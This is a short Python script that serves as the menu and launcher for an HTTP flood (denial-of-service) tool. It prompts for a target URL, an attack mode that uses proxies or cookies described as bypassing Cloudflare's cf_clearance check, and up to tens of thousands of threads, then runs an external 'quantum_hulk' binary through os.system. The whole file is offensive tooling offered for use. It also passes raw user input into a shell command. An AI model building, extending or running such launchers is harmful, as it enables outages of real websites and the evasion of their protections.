#!/usr/bin/env python3
import os
from colorama import Fore, Style, init
init(autoreset=True)
os.system('clear')

print(Fore.RED + Style.BRIGHT + """
███████ ███████ ██    ██
██      ██       ██  ██       
█████   ███████   ████
██           ██    ██
██      ███████    ██
""")
print(Fore.RED + "V1 — REAL POWER\n")

target = input(Fore.CYAN + "Target URL → ").strip()
if not target.startswith("http"):
    target = "https://" + target

print(Fore.RED + "\nAttack Mode:")
print("1 — Raw")
print("2 — Proxy list")
print("3 — Cookies (bypassed cf_clearance)\n")

choice = input(Fore.CYAN + "Choose (1/2/3) → ").strip()
threads = input(Fore.CYAN + "Threads (100-20000) → ").strip() or "80000"

if choice == "2":
    mode = "proxy"
    file = input(Fore.CYAN + "Proxy file → ").strip() or "proxies.txt"
elif choice == "3":
    mode = "cookie"
    file = input(Fore.CYAN + "Cookie file → ").strip() or "TERMUX_SOLVED.txt"
else:
    mode = "raw"
    file = ""

# FIXED COMMAND — uses positional args correctly
cmd = f"./quantum_hulk ULTIMATE {target} {mode} {threads}"
if file:
    cmd += f" {file}"

print(Fore.RED + f"\nLAUNCHING {mode.upper()} ATTACK → {threads} threads\n")
os.system(cmd)
